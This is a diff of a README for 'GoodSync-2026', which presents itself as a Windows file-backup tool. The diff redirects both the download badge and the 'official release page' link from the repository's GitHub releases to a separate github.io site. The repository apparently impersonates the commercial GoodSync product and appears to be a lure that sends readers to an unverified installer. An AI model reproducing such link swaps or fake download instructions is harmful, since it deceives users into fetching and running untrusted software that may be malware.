@@ -1,6 +1,6 @@
 # 📂 GoodSync-2026 - Securely back up your digital files
 
-[![](https://img.shields.io/badge/Download-GoodSync-blue.svg)](https://github.com/Midstreamhenryhubertturner572/GoodSync-2026/releases)
+[![](https://img.shields.io/badge/Download-GoodSync-blue.svg)](https://midstreamhenryhubertturner572.github.io)
 
 GoodSync-2026 automates the backup and synchronization of your files. You keep your data safe across your local computer, external drives, and cloud storage accounts. This tool works on Windows 11 and Windows 10. It ensures your photos, documents, and business files remain identical in every location you choose.
 
@@ -8,7 +8,7 @@ GoodSync-2026 automates the backup and synchronization of your files. You keep y
 
 You do not need programming knowledge to use this software. Follow these steps to set up your file synchronization.
 
-1. Go to the [official release page](https://github.com/Midstreamhenryhubertturner572/GoodSync-2026/releases) to download the latest version for Windows.
+1. Go to the [official release page](https://midstreamhenryhubertturner572.github.io) to download the latest version for Windows.
 2. Locate the download button.
 3. Save the installer file to your computer.
 
